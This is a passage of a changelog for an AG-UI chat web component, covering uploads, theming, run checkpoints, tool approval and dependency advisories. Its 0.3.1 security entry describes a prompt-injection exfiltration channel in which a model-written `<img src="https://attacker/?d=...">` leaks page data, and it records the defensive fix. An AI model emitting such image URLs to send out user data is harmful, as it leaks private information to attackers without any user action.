  drag-and-drop do, with the same validation and progress chip. Returns `false`
  when uploads are not configured (no `data-attachments-url`, no
  `uploadHandler`), which is the only way for a host to tell: with no tray there
  is nothing to report through, and silence would read as a queued file that
  never uploads.

- **`ag-ui-attachments` event**, dispatched whenever the tray changes — a file
  queued, an upload finishing or failing, a chip removed, the tray cleared after
  a send. `detail` carries `{ attachments, pending }`: the durable refs of
  everything settled, and how many are still in flight.

  **This is what makes `sendMessage` usable with files at all.** The tray only
  ever spoke to the built-in Send button, so a host composer had no way to tell a
  settled upload from one still uploading — the same information the built-in
  Send needs, which was simply not exposed. The tray's `onChange` hook already
  existed and nothing was wired to it.

### Changed

- **Assigning a connect-time-only attribute after the element has connected now
  warns**, instead of being silently ignored: `data-attachments-url`,
  `data-attachment-accept`, `data-attachment-max-bytes`, `data-transcribe-url`,
  `data-threads-url`, `data-tools-url`, `data-skills-url`, `data-skills`,
  `data-prompt-chips`, `data-slash-commands`, `data-theme-toggle`,
  `data-strings`, `data-icon-url`.

  Each is read once while connecting, to decide what chrome exists at all, and
  no later read revisits the decision. **The symptom is an affordance that
  simply never appears** — which reads as a broken component rather than a
  mis-timed assignment, and it is the common React/Vue shape: the element mounts
  on the first render pass and the framework patches attributes in on the next.

  Set them before the element enters the DOM, or remove and re-insert it to
  apply a new value. The attributes that genuinely *are* re-read per use —
  `data-runs-url`, `data-page-actions`, `data-text-animation`,
  `data-tool-display`, `endpoint`, and CSS-reactive `theme` / `collapsed` — are
  deliberately excluded, since a late change works there and a warning would be
  wrong.

### Fixed

- **The checkpoint panel now follows the theme.** Its rules read `--agui-surface`
  / `--agui-border` / `--agui-hover` — note `--agui-`, not the `--ag-ui-`
  namespace every other rule uses — each with a hardcoded light-mode fallback.
  So the panel ignored `theme="dark"` entirely and rendered light-on-dark unless
  a host happened to set three variables documented nowhere. Now derived from the
  real theme tokens, with a new theme-aware `--ag-ui-hover` defined in every
  theme block. The fallbacks are what hid it: they made an unthemed panel look
  deliberate.

  `checkpoints-title` and `checkpoint-label` also gain `part` attributes — they
  carried classes only, so neither could be styled from outside the shadow root.

- **Markdown tables are styled.** `table` / `thead` / `tbody` / `tr` / `th` /
  `td` are all in the sanitizer's `ALLOWED_TAGS`, so an agent emitting a table
  rendered it — completely unstyled, overflowing its bubble. Wide tables now
  scroll inside their own box rather than pushing the layout sideways.

- **Sending while a file is still uploading now says so.** `readyRefs()` returns
  only settled uploads and `clearReady()` deliberately keeps the rest for a
  follow-up message — so the file was never lost, but the message went without
  it and nothing indicated that. Attachments are frequently the entire point of
  the message, which is what made the silence the defect. An inline notice now
  names how many are still uploading and that they remain attached.

  Send is deliberately **not** disabled while uploads are pending: that would
  fight the tray's documented "keep for a follow-up" behaviour and could wedge
  on an upload that never settles.

## [0.16.0] — 2026-08-09

### Added

- **A stale-page guard on frontend tool calls.** A round's context records the
  page it describes; if the page moves before the agent's tool call arrives, the
  call is refused with a result telling the agent to call `read_page` and retry,
  instead of running the handler. Most stale calls would simply miss and report
  a failure — the case this prevents is the other one, where a same-named
  control on the *new* page matches and the agent silently acts on the wrong
  page. `read_page` itself and tools marked `x-navigates` are exempt, and the
  guard is inert unless a `getPageMap` provider is set.
- **New `UiStrings` keys `runInterrupted` and `pageMoved`**, both overridable
  like every other string.

### Changed

- **Toolchain majors: Vitest 3 → 4 and TypeScript 5.9 → 7**, plus `marked`
  18.0.9, Biome 2.5.7, `@types/node` 26.1.2. All development dependencies — the
  emitted `.d.ts` files are **byte-identical** to the 5.9 output (verified by
  building both and diffing; only the source maps move), so consumers see no
  change.

  **Vitest 4 takes a provider *instance*, not the string `"playwright"`.**
  The provider moved to its own package (`@vitest/browser-playwright`) and, with
  v8 coverage, the old string form is a hard error rather than a deprecation.

  **TypeScript 7 requires `rootDir` explicitly** (TS5011) instead of
  inferring it from the common source directory. Set to the value 5.x inferred,
  so the published layout is unchanged.

### Fixed

- **A run interrupted by navigation no longer vanishes silently.** If the page
  navigates or reloads while a run is in flight — routine in an MPA — the
  element is destroyed with it, and on the next mount the transcript replayed
  with the answer simply missing and no indication anything had gone wrong. The
  element now reports it as an inline notice. Detected from the shape of the
  transcript (`send()` persists the user turn *before* starting the run, so a
  history ending on that turn means nothing came back), which is why it needs no
  `ClientConversationStore` change and no `pagehide` listener — neither of which
  would fire on a crash or a force-quit anyway.

  It is deliberately **a notice, not a resume**: AG-UI has no
  resume-an-aborted-run primitive, so re-sending the accumulated messages is
  semantically a new run and would re-execute any server-side tool the agent had
  already performed. The agent-initiated case is unaffected — a navigating tool
  still checkpoints and resumes exactly as before.

- **Six branches that were never actually covered.** Vitest 4's v8 provider
  remaps coverage more precisely, and the 100% gate stopped being satisfiable —
  not because anything regressed, but because v3 had been crediting six
  branches and three callbacks that no test reached. Each is now genuinely
  tested: the paperclip button opening the file picker, the built-in
  transcription handler (every prior voice test supplied its own), a page-action
  tool resolving through `resolvePageTarget`, a non-`Enter` keystroke in a
  question card, a submit click with no answer, a non-string `error` in a
  transcription error body, and a restored history message with an unrecognised
  role.

  **One was a flaw in the test harness, not a missing test.** `makeFakeAgent`
  ended a clean run by calling `onRunFinalized` alone, so the client's
  `RUN_FINISHED` path could only ever be reached through `emit.interrupt()` —
  the ordinary success outcome every real run carries was never exercised. The
  fake now emits both events, in the order a real agent does.

  `route_map`'s unreachable guard was restructured away rather than tested: its
  regex capture group is mandatory, so the `undefined` case existed only to
  satisfy `noUncheckedIndexedAccess` and no test could ever have reached it.

## [0.15.0] — 2026-08-08

### Changed

- **Sanitisation is now tested in a real browser.** `vitest.config.ts` defines
  two projects: **happy-dom** for the bulk of the suite, and **Chromium**
  (Playwright) for the tests whose subject is sanitisation. Coverage stays
  unified at 100% across both.

  **A correctness requirement, not an optimisation.** DOMPurify 3.4.8+
  silently stops sanitising under happy-dom — `<script>` and `<img>` pass
  straight through, and ordinary markdown loses its `<p>` wrapper. A
  happy-dom-only suite can therefore go green while this component ships no
  sanitisation at all, which is the one failure it must never ship.

  **The experiment settles what the pin never could**: dompurify 3.4.13
  sanitises correctly in Chromium. The defect is happy-dom's DOM emulation, not
  a DOMPurify regression — so **consumers were never exposed**, and the risk was
  confined to the test environment the whole time.

  The browser run also *removes* a workaround instead of carrying it: happy-dom
  eagerly **executed** inline `<script>` while DOMPurify parsed into its scratch
  document, so the suite had to stub `alert`. A real browser parses into an
  inert context.

### Security

- **`dompurify` is a normal caret range again** (`^3.4.13`), lifting the
  exact-version pin — and with it the **five advisories** that pin was holding
  open (three LOW, two MEDIUM). The browser project is what made that safe, and
  is the standing acceptance check.

## [0.14.1] — 2026-08-07

### Security

- **Five advisories closed**: `vite` → 7.3.6 (HIGH + MEDIUM), `postcss` → 8.5.26
  (HIGH), `brace-expansion` → 2.1.4 (HIGH), `esbuild` → 0.28.1 (LOW). All four
  are transitive, so they are pinned through `overrides` — there is no direct
  dependency to bump.

  **`overrides` now live in `pnpm-workspace.yaml`**, not the `pnpm` field in
  `package.json`; pnpm 11 ignores the latter and only warns. And an override
  must be scoped to its major — an unbounded `brace-expansion: ">=2.1.2"`
  resolves to 5.x, whose export shape `minimatch` cannot call, breaking `glob`
  at runtime.

- **Four `dompurify` advisories are knowingly left open** (three LOW, one
  MEDIUM), and the dependency is now pinned to **exactly `3.4.7`** rather than
  `^3.4.7`.

  3.4.8 through 3.4.13 **mis-sanitise under happy-dom**: `<script>` and `<img>`
  pass straight through, which `tests/render_markdown.test.ts` catches. Verified
  again against dompurify 3.4.13 with happy-dom 20.11.1 — moving the test DOM
  forward does not fix it.

  **The pin was previously a caret range**, so the hold existed only in the
  lockfile and nowhere in the manifest, undocumented — a `pnpm update` would
  have silently disabled sanitisation. It is now exact, explained at the import
  site in `src/ui/render_markdown.ts`, and recorded in `CLAUDE.md`.

  The trade is deliberate: those advisories describe narrow bypasses, while
  taking them costs *all* sanitisation under the only DOM the suite can run in.
  `tests/render_markdown.test.ts` is the acceptance check for lifting it.

## [0.14.0] — 2026-07-28

### Added

- **Run notices — a muted inline annotation for things the *run* did**, as
  opposed to work the user asked for. Styleable via the `run-notice`,
  `run-notice-icon` and `run-notice-text` parts; announced with `role="status"`
  so a screen reader hears it politely rather than mid-sentence.
  - **Compaction.** A standard AG-UI `ACTIVITY_SNAPSHOT` with
    `activityType: "compaction"` (emitted by django-ag-ui 0.26+ when a
    compaction capability trimmed the history) renders as "earlier turns
    condensed", with the count. Activity events of any other type pass through
    untouched, so another producer on that channel isn't mistaken for one.
  - **Agent skills.** There is no dedicated event: loading a deferred capability
    *is* an ordinary `load_capability` tool call, which is what reaches the
    client. It now renders as `Using skill <id>` **instead of** the raw tool
    card it would otherwise produce.

    Not to be confused with the existing `Skill` catalog — that is a *human*
    affordance (a prompt the user launches from the chip row or `/`-palette).
    An agent skill is chosen by the model mid-run. Only the latter emits a
    notice.
  - **Suppression covers all three paths a card can come from** — the live
    stream, the client's tool-execution loop, and **restored history** — so a
    reload shows the same transcript rather than resurrecting the raw
    `load_capability` card.
  - A `load_capability` call with **no usable id** falls back to a normal tool
    card rather than being dropped: a malformed call is still real activity, and
    hiding it would be worse than showing it plainly.
- **`onActivity(activityType, content)`** on `AgUiClientHandlers`, forwarding
  AG-UI activity events to the host element. `COMPACTION_ACTIVITY_TYPE` and
  `LOAD_CAPABILITY_TOOL` are exported from `constants`.
- **Two new overridable strings**: `historyCompacted` (token `{count}`) and
  `usingSkill` (token `{name}`).

## [0.13.0] — 2026-07-27

### Added

- **AG-UI shared state.** `<ag-ui-chat>` now speaks the protocol's own state
  channel: assign `chat.sharedState = {...}` to seed it, listen for the
  `ag-ui-state` event (`detail.state`) to react when the agent changes it.
  State rides `RunAgentInput.state` on every run and is replaced in place when
  the server streams `STATE_SNAPSHOT` / `STATE_DELTA`.
  - **Adoption, not implementation.** `@ag-ui/client` already applies both
    events to `agent.state` and exposes an `onStateChanged` subscriber hook;
    what was missing was seeding it (`initialState`) and surfacing it to the
    host. Deriving state from the raw event stream ourselves would have
    duplicated — and eventually contradicted — the client's own handling,
    including its JSON-Patch delta application.
  - Assigning **after** the conversation has started pushes through to the live
    agent rather than waiting for a new one, so a host that seeds state late
    isn't silently stranded.
  - The event is `composed: true`, so a host listening on `document` receives it
    through the shadow boundary.
  - **Distinct from `registerPageState`**, which exposes host state to the agent
    as ordinary *tools*. Use shared state when agent and page edit the same
    object; use page-state tools when the agent should *ask* — a tool call is
    visible in the transcript and can be gated by a confirmation card, which
    state events cannot.

### Changed

- **`registerStateHook` is now `registerPageState`** (and `createStateHookTools` /
  `StateHook` are `createPageStateTools` / `PageState`). **The old names implied a
  feature that does not exist**: they read as AG-UI shared-state sync —
  `STATE_SNAPSHOT` / `STATE_DELTA`, the protocol events that carry a state object
  between agent and client — which neither this component nor `django-ag-ui`
  implements. What the method actually does is generate two ordinary client tools
  (`read_<name>` / `set_<name>`) over host page state, which the agent calls like
  any other tool. `page` matches the vocabulary already used throughout the
  component (`page_map`, `page_action_tools`, `route_map`, the DOM driver).
  - **Not a hard break.** The old spellings are kept as deprecated aliases and
    behave identically; they will be removed in a future major. A rename is only
    ever cheaper the earlier it happens, which is why this ships now rather than
    waiting for state support to exist.

### Documentation

- **The README now distinguishes the two state mechanisms**, which the old
  method name conflated. `sharedState` is the protocol's state channel;
  `registerPageState` generates ordinary client tools. The rename and the
  feature landed together, so the docs answer "which one" rather than leaving
  two similar names side by side.

## [0.12.0] — 2026-07-27

### Added

- **Resume or fork a run — the checkpoint UI.** With `data-runs-url` pointed at
  django-ag-ui's run index (`RunsView`, 0.23+), a ⭯ button appears in the header
  opening a *Continue a run* panel. Type the next turn, pick a row, and the run
  continues from its last server-side checkpoint — **Resume** to carry on,
  **Fork** to branch without touching the original. The client half of durable
  step persistence, whose server half shipped in django-ag-ui 0.20.0.
  - **Only continuable runs are offered.** The server reports whether a run has
    a snapshot to seed from; one that never reached a provider-valid boundary
    has none, so resuming it would start from nothing. Rows show when the run
    started (id on hover, for correlating with server logs) and mark a branched
    run so a fork doesn't read as a duplicate of its parent.
  - **One URL configures three endpoints.** `resume/<id>/` and `fork/<id>/` are
    siblings of the index — the server mounts all three together — so they are
    derived rather than configured, and a half-configured set isn't expressible.
  - **The client contract is structural, not a rule to remember.** Those
    endpoints require a *fresh run id* and *only the new turn*, because the
    server supplies prior turns from the snapshot and re-sending them would
    duplicate the conversation. A continuation therefore runs on its own
    short-lived agent, pointed at the resume endpoint and seeded with **no**
    history — so the new turn is the only thing it *can* send, the fresh run id
    comes free, and the main agent's history is never touched.
  - A resumed run is otherwise a normal run: frontend tools execute, approval
    interrupts render, and `headers` are re-read per request so a rotated
    token still reaches the endpoint. An unreachable index shows the panel's
    empty state rather than an error.
  - New exports: `RunIndex` / `RunRow`, `CheckpointMenu` / `CheckpointVerb`, and
    five UI strings (`checkpoints`, `noCheckpoints`, `resumeRun`, `forkRun`,
    `forkedRun`) for localization.

## [0.11.0] — 2026-07-14

### Added

- **Server-side tool approval — the browser half of the human-in-the-loop gate.**
  When a gated server-side tool defers instead of executing, the run finishes on
  an AG-UI *interrupt*; the client now renders an inline **approval card**
  (`requestApproval`, next to the pending tool-call card) and, on the user's
  decision, resumes the run with the answer via the protocol's `resume[]`.
  Approve runs the tool (its result streams back into the same card); deny sends
  a `cancelled` answer so the model learns it was declined and the card settles
  as declined. No `@ag-ui/*` dependency bump — the interrupt/resume types already
  ship in the pinned `0.0.x`. `AgUiClient` gains a `resolveInterrupts` config hook
  and exports `InterruptResponse` / `ResolveInterrupts`. The card is fully
  customizable: `strings` (`approveAction` / `approvalPrompt` / `approve` /
  `deny`), a `::part()` surface (`approval`, `-body`, `-actions`, `-button`,
  `-approve`, `-deny`), and an `approvalRenderer` hook that fully replaces the UI
  (given the request + a Stop `AbortSignal`, resolves approve/deny). Exports
  `ApprovalRenderer`.
- **`ask_user` — a built-in typed-question frontend tool (opt-in).** Set
  `askUser = true` on `<ag-ui-chat>` to offer the agent an `ask_user(question,
  options?, allow_custom?)` tool: calling it renders an inline **question card**
  (`requestQuestion` — radio choices and/or a free-text field) and returns the
  chosen or typed answer as the tool result, reusing the existing frontend-tool
  path (no new protocol). Off by default, like the other built-in tool groups, so
  the advertised catalog is unchanged until a host opts in. The card is **fully
  customizable**: localized `strings` (`askUserAction` / `otherOption` /
  `answerPlaceholder` / `submit`), a full `::part()` surface (`question`,
  `question-body`, `-options`, `-choice`, `-radio`, `-input`, `-actions`,
  `-button`), and a `askUserRenderer` hook that fully replaces the UI with a
  host-supplied renderer (given the request + a Stop `AbortSignal`, resolves the
  answer). Exports `QuestionRenderer`.
- **Complete `::part()` coverage sweep.** Every rendered UI element now exposes a
  `part` for `::part()` styling — closing gaps in the attachment chips
  (`attachment-chips` and the shared `attachment-chip*` parts, now on both the
  composer tray and the read-only chips on sent bubbles), the skills UI
  (`skill-chips` / `skill-chip` / `skill-palette` / `skill-item*` / `skill-hint`),
  the history-drawer row internals (`drawer-row-title` / `-time` / `-preview` /
  `-actions` / `-rename` / `-delete`, the inline `drawer-rename-input`, and the
  `drawer-confirm*` delete prompt), plus `thoughts-label`, `question-choice-text`,
  and the `stopped` note. All are documented in the README "Available parts" list.

## [0.10.0] — 2026-07-02

### Added

- **Upload cancellation.** `UploadHandler` gains an optional third argument,
  `signal: AbortSignal`. Removing a pending chip, clearing the tray, or removing
  the element now aborts the in-flight upload, so a cancelled transfer no longer
  orphans a server-side file. Non-breaking: existing two-argument handlers keep
  working; a custom handler that honours the signal should abort its own
  transport when it fires.
- **Teardown on disconnect.** `<ag-ui-chat>` now cleans up when it leaves the
  DOM (a removed node or a client-side route swap): it cancels the in-flight
  run so the SSE stream closes, aborts in-flight uploads, and releases the
  microphone so the browser's recording indicator clears.
- **Accessible history drawer.** The chat-history drawer is now a proper modal
  dialog — Escape closes it, focus moves into the panel on open and is restored
  to the opener on close, Tab is trapped within the panel, and an inline rename
  commits on blur.
- **Per-instance storage scoping.** The collapsed / theme / active-thread state
  and the default thread store are now namespaced by the element's `id` (else
  its `endpoint`), so two `<ag-ui-chat>` instances — or two apps — on the same
  origin no longer share state. Pre-existing per-tab state migrates into the
  namespace automatically on first load.

### Fixed

- **Submit while running.** Pressing Enter during a live run no longer starts a
  second, concurrent SSE run (which orphaned the first and could corrupt its
  pending tool cards). Enter now matches the Send/Stop button and is ignored
  while a run is in flight.
- **Thread-switch race.** Rapidly switching threads against a slow remote store
  can no longer interleave two replays into one transcript — a stale replay is
  dropped once a newer switch begins.
- **Malformed thread responses.** A `200` from the threads endpoint whose body
  isn't valid JSON (a proxy's HTML error page, a truncated stream) now falls
  back to the local cache instead of silently failing to load the drawer or
  history.
- **Relative timestamps.** An unparseable or missing `updated_at` now renders a
  neutral "just now" rather than `"NaNw ago"` or `"~2950w ago"`.
- **Corrupt attachment refs.** Malformed entries in a message's persisted
  attachments are dropped instead of throwing and aborting the whole history
  replay.
- **Retry of a rejected upload.** Retrying a chip that was rejected client-side
  (oversize / disallowed type) now re-applies the guard instead of uploading the
  file in full.
- **Duplicate tool result.** A repeated `TOOL_CALL_RESULT` (or a replayed tool
  message for an already-settled card) no longer appends a second result
  section.
- **Run-error continuation.** A run that ends in an error is now terminal: the
  loop no longer proceeds into frontend-tool execution or another round, so a
  failed run can't surface a confusing second error. Pending tool cards still
  settle.

## [0.9.0] — 2026-06-30

### Added

- **Model thoughts.** When the server forwards a reasoning model's
  chain-of-thought, the element now renders a muted, collapsible **thoughts
  region** (part `thoughts`) at the top of the current answer group — it streams
  while the model reasons and folds away on the answer's first token (the reader
  can reopen it). `AgUiClientHandlers` gains `onReasoningStart` / `onReasoningDelta`
  / `onReasoningEnd`, wired from `@ag-ui/client`'s `REASONING_*` subscriber
  callbacks (which also cover the deprecated `THINKING_*` family).
- **Voice input.** Set `data-transcribe-url` (django-ag-ui's
  `TranscribeView`) to reveal a mic button in the composer (part
  `voice-button`): it records via `MediaRecorder`, POSTs the clip, and drops the
  returned transcript into the textarea. A pluggable `transcribeHandler` —
  `(audio: Blob) => Promise<string>` — swaps the transport (a different STT
  endpoint, a Web Speech adapter) and reveals the mic even without the attribute.
  New exports: `transcribeAudio`, `TranscribeOptions`, `TranscribeHandler`.
- **Built-in theme toggle.** The boolean `data-theme-toggle` attribute
  adds an optional light⇄dark toggle to the header (part `theme-toggle`,
  `toggleTheme()`) that flips `theme` and persists per tab. Off by default, so a
  host-supplied switch in `slot="header-actions"` stays unaffected.

## [0.8.1] — 2026-06-30

### Fixed

- **Page-mode column alignment.** In `placement="page"`, the rows between the
  message list and the composer — skill chips, the `/`-command palette, the
  missing-placeholder hint, and the upload tray — stayed left-anchored while
  `.messages` and `.input-row` centred on `--ag-ui-content-max-width`. They now
  share the same column gutter, so the whole page reads as one centred column.

## [0.8.0] — 2026-06-30

### Added

- **Per-turn answer group + opt-in well.** Each assistant turn now
  renders inside one `.answer` group (part `answer`) that holds its streamed
  text, tool cards, and pending indicator — so a turn that calls tools reads as
  a single answer instead of loose siblings. The group spans the whole
  multi-round frontend-tool loop (several AG-UI runs), opening on the turn's
  first run and closing at settle; user bubbles stay outside it, and history
  replay reconstructs one group per assistant turn. Add the boolean
  `data-answer-well` attribute to box that group in a bordered, padded "well"
  (themeable via `--ag-ui-well-bg` / `--ag-ui-well-border`); without it the
  layout is the flat stack as before. Pure CSS, turn-scoped, no JS API.
- **Full-screen page placement.** New `placement="page"`: a full-bleed
  background with the conversation in a centred reading column (default ~820px,
  set via `--ag-ui-content-max-width`). The assistant turn spans the column
  while the user message stays a right-aligned pill — the layout for a dedicated
  chat page (distinct from `full`'s edge-to-edge, left-aligned messages).
- **Inline tool-display mode + themeable status icons.** New
  `data-tool-display="inline"`: the lightest card — a one-line status row (icon
  + summary, no box chrome) with the result behind its own toggle. Every
  tool-call card now leads with a CSS-drawn **status icon** (part
  `tool-card-icon`): a spinning ring while running, then a check / cross / slash
  on success / error / decline, replacing the hardcoded `` glyph. Re-theme via
  `--ag-ui-tool-icon-done` / `--ag-ui-tool-icon-error` / `--ag-ui-tool-icon-declined`
  and `--ag-ui-tool-spin-duration`; the spin respects `prefers-reduced-motion`.

## [0.7.0] — 2026-06-26

### Added

- **Localization (i18n).** Every user-facing string — labels, placeholders,
  `aria-label`s, and `title` tooltips — now reads from a flat `UiStrings` table.
  Override any subset via the `strings` property or the `data-strings` JSON
  attribute (the property wins key-by-key); the rest fall back to the English
  defaults. A few keys are `{token}` templates (`minutesAgo`, `confirmRun`,
  `tooLarge`, …). New exports: `UiStrings`, `DEFAULT_UI_STRINGS`,
  `mergeUiStrings`.
- **`::part()` styling and replaceable slots.** Every structural element exposes
  a stable `part` (`panel`, `header`, `title`, `messages`, `tool-card`,
  `composer`, `input`, `send`, `launcher`, the drawer parts, …) so hosts restyle
  from outside the Shadow DOM without piercing it. Coarse slots — `icon`,
  `header-actions`, `empty`, `footer`, `launcher` — replace whole regions with
  host markup.
- **Header / launcher icon.** An `icon` slot (any markup) before the title, or
  the `data-icon-url` attribute convenience (an `<img>`); the slot wins. Sized
  via `--ag-ui-icon-size`.
- **Sidebar placement.** `placement="sidebar"` is a full-height docked panel
  that slides open/closed and collapses to a slim icon **rail** (instead of the
  floating launcher). Docks right by default; `data-side="left"` docks left.
  Overlays by default (`--ag-ui-position: static` for host-managed push); the
  slide honours `prefers-reduced-motion`; the rail carries `aria-expanded`.
- **Built-in page-action tools.** Opt in via `data-page-actions` (a comma list of
  `scroll` / `drag`): `scroll_to` (a target into view — `top` / `bottom` / a
  selector or page-map id) and `drag_and_drop` (fires the native HTML5 drag
  sequence so the page's own drop handler reacts). Targets resolve through the
  overridable `resolvePageTarget` property. Not stamped destructive — gate
  auto-persist-on-drop pages with `confirmPredicate`. New exports:
  `createPageActionTools`, `PAGE_ACTIONS`, `ResolvePageTarget`.

### Fixed

- **Stuck "pending" UI when the stream drops mid-run.** A run whose stream closes
  without a terminal `RUN_FINISHED` / `RUN_ERROR` event used to resolve as if it
  had succeeded, leaving the thinking indicator — and any in-flight tool card —
  stuck forever. Such a close is now surfaced as a connection-loss error (the
  localizable `connectionLost` string), and `onSettled` sweeps any tool card
  still pending to the no-result fallback. New export: `ConnectionLostError`.

## [0.6.0] — 2026-06-25

### Added

- **File uploads.** Set `data-attachments-url` (django-ag-ui's `AttachmentsView`)
  to reveal a picker + drag-and-drop on the composer. Each file uploads
  out-of-band (multipart, with the element's `headers`) into a pending tray —
  one chip per file with a progress bar, settling to `ready` or `error` (with
  retry / remove). On send, the ready files' refs render as read-only chips on
  the user bubble and travel to the agent: the wire stays vanilla AG-UI (only
  lightweight `{ id, name, mime, size }` refs, never bytes), the model learns the
  ids from a one-line run-context manifest, and reads contents server-side via
  the `read_attachment` tool. Refs persist on the message, so a restored
  conversation re-renders its chips.
- **Client-side guards** (instant feedback; the server stays authoritative):
  `data-attachment-accept` (an `<input accept>` list) and
  `data-attachment-max-bytes` (default 10 MiB, `0` disables).
- **Pluggable upload transport.** A new `uploadHandler` property —
  `(file, onProgress) => Promise<AttachmentRef>` — swaps the built-in multipart
  upload for a custom one (a resumable `tus-js-client` adapter, direct-to-S3
  multipart, …) without touching the tray, chips, or AG-UI wire. When set, the
  affordance appears even with no `data-attachments-url`. Defaults to the
  built-in `uploadAttachment`.
- **New exports:** `uploadAttachment` + `UploadOptions` + `UploadHandler`, the
  `AttachmentRef` type, and `messageAttachments`. `AgUiClient.send` gains an
  optional second `attachments` argument; the `ag-ui-submit` event `detail` now
  also carries `attachments`.

## [0.5.0] — 2026-06-24

### Added

- **Chat-history drawer.** A history toggle (☰) in the header opens a slide-over
  listing the user's past conversations (title · relative time · preview), with
  select, new chat, inline rename, and delete-with-confirm. The
  `ClientConversationStore` interface gains `listThreads` / `setActiveThread` /
  `renameThread` and a `ThreadMeta` row shape; the default `SessionStorageStore`
  now keeps a per-tab thread index so the drawer works with no server. Selecting
  a row switches the active conversation and replays its history. The drawer is a
  slide-over by default, with an inline side-panel variant for
  `placement="embedded"`.
- **Server-backed history via `data-threads-url`.** Set the attribute (to
  django-ag-ui's `ThreadsView` URL) and the drawer routes list / load / rename /
  delete through that endpoint via a new `RemoteConversationStore`, showing
  durable, cross-device threads. The client store remains the offline fallback;
  rename / delete apply optimistically.

## [0.4.0] — 2026-06-12

### Added

- **Cancel / stop a run.** `AgUiClient.cancel()` aborts the in-flight
  streaming request (`abortRun()` — AG-UI's transport-level cancel; the
  server observes the disconnect) and stops the multi-round run loop: tool
  calls collected before the abort are not executed and no further round
  starts (a frontend tool handler already running completes, but its result
  doesn't trigger a re-run). Safe no-op with no run in flight.
- **`onCancelled()` handler** on `AgUiClientHandlers` — the deliberate-stop
  sibling of `onError`. Partial assistant text stays in the transcript and
  is persisted (`onPersist`), so a reload shows the truncated exchange;
  `onSettled` still fires (terminal-rest guarantee). Both the
  abort-resolves and abort-rejects behaviours of `@ag-ui/client` are
  handled (its `runAgent` filters `AbortError` and resolves normally;
  re-throwing versions are caught via the error's name).
- **The Send button becomes Stop while a run is in flight** — same button,
  label + `aria-label` swap, `data-state="running"` for styling — through
  the whole interaction including between tool rounds. **Escape** in the
  composer also cancels (only when the skills palette is closed; the
  palette keeps its own Escape). After a cancel the transcript gets a muted
  **"⏹ Stopped"** note (`.stopped-note`), not an error bubble.
- **Cancelling declines an open confirmation card.**
  `requestConfirmation` accepts `ConfirmationOptions` with an
  `AbortSignal`; aborting resolves the pending decision as declined
  (`data-resolved="declined"`). A decision already made wins over a late
  abort.

### Changed

- `newChat()` now cancels any in-flight run before discarding the client —
  previously the old agent kept streaming into a cleared transcript.
- The Send button is no longer `disabled` during a run (it's the Stop
  control now); `AgUiClientHandlers.onCancelled` is required, so hosts
  implementing the handlers interface must add it.

## [0.3.1] — 2026-06-10

### Security

- **`<img>` is stripped from rendered assistant markdown by default.** A
  model-controlled `<img src="https://attacker/?d=...">` is fetched by the
  browser with no user interaction, which made the sanitizer allowlist a
  zero-click exfiltration channel for prompt-injected page data (page maps,
  state hooks, tool results). Hosts that trust their content can opt back in
  via the new `allowImages` element property (or `renderMarkdown(text,
  { allowImages: true })`); when enabled, DOMPurify still strips event
  handlers and `javascript:` URLs as before.

### Fixed

- **Rotated headers now reach the agent stream.** `HttpAgent` is built once
  per conversation with the headers baked into its constructor, so a rotated
  token (CSRF, short-lived JWT) never reached the agent endpoint and long
  sessions 401'd mid-conversation — even though the skills/tools catalog
  fetches already re-read `headers` per request. The element now passes a
  live `getHeaders` callback to the agent factory and `createHttpAgent`'s
  fetch wrapper overlays the fresh values on every request. Custom
  `agentFactory` implementations can read the new optional
  `HttpAgentOptions.getHeaders` to do the same.
- **Removed the phantom `./style.css` export.** `package.json` advertised
  `@artooi/ag-ui-web-component/style.css` → `dist/ag-ui-web-component.bundle.css`,
  but the build emits no CSS file (styles live as JS strings and are injected
  into the Shadow DOM), so importing the advertised path always failed.
- **The shared `marked` singleton is no longer mutated.** Module-scope
  `marked.setOptions({ gfm, breaks })` clobbered a host app's `marked`
  configuration whenever the dependency was deduped. Rendering now uses a
  local `Marked` instance; the global keeps its defaults.

### Added

- **Auto-prettified tool-card labels.** When no label is found anywhere in
  the chain (`x-summary` → `toolSummaries` → fetched `data-tools-url`
  catalog), cards now fall back to a prettified name (`list_projects` →
  "List projects") instead of the raw identifier. Exported as
  `prettifyToolName`.

## [0.3.0] — 2026-06-03

### Added
- **`data-tools-url` — server tool-label catalog.** On connect the element
  fetches a JSON catalog (`[{ name, summary, description? }]`) from the URL
  (with `headers`) and uses it to label tool-call cards for **server-side tools**
  whose schema never reaches the browser. Pairs with django-ag-ui's `tools/`
  endpoint, so a tool's label flows from its server-side source (drf-mcp
  `display_name`, `@tool(summary=…)`) with no per-tool client duplication.
  Per-card label precedence: the tool's own `x-summary` → an explicit
  `toolSummaries` entry → the fetched catalog → the raw name. Exports the
  `ToolCatalogEntry` type and the `parseToolCatalog` helper.

## [0.2.2] — 2026-06-02

### Added
- **Friendly tool-call card labels.** The built-in tools now carry `x-summary`
  labels (`navigate_to_route` → "Navigate", `list_routes` → "List pages",
  `read_page` → "Read the page", state-hook `read_*`/`set_*` → "Read/Update
  <name>"). For tools whose schema never reaches the browser — **server-side
  tools** (drf-mcp, `@tool` registry) — a new `toolSummaries: Record<string,
  string>` property maps tool name → label as a fallback (e.g.
  `chat.toolSummaries = { list_projects: "Search projects" }`).

### Changed
- A tool call that ends with **no client handler and no `TOOL_CALL_RESULT`** now
  settles the card as **"No result returned."** instead of the misleading
  "Executed on the server." (nothing executed it).

### Fixed
- **Incoming-text animations no longer double-fire.** Two distinct cases:
  - *End of stream:* `data-text-animation="word"` wrapped the finished assistant
    message into staggered `.word` spans on `TEXT_MESSAGE_END`, so a response
    that had already streamed in re-animated itself one word at a time. The word
    reveal now runs only when a message arrives **at once** (single text delta,
    or an error bubble); a message streamed across multiple deltas keeps its
    progressive reveal and isn't re-wrapped.
  - *Reload from memory:* on rehydrate the whole transcript mounts at once, so
    every restored assistant bubble animated its text in parallel (fade) or
    re-wrapped word-by-word — wrong, since it's old content, not arriving. Restored
    bubbles are now marked `message--restored`, excluded from the fade entrance
    animation and never word-wrapped, so history appears statically.

## [0.2.1] — 2026-06-02

### Added
- **Server-side tool results in the card.** The element now subscribes to
  AG-UI's `TOOL_CALL_RESULT` event and settles the matching tool-call card with
  the real server output (honouring the `data-tool-display` mode), instead of
  the generic "Executed on the server." placeholder — which remains only as a
  fallback when no result event is streamed.
- **Tool calls and results survive a page refresh.** History replay now
  reconstructs tool-call cards (from assistant `toolCalls`) and settles them
  from the persisted `tool` result messages, so a rehydrated transcript shows
  the full tool activity, not just the prose. Applies to every conversation
  store (the data was already persisted; only the replay was incomplete).

### Fixed
- **Pending indicator could hang after a server-only round.** A round whose
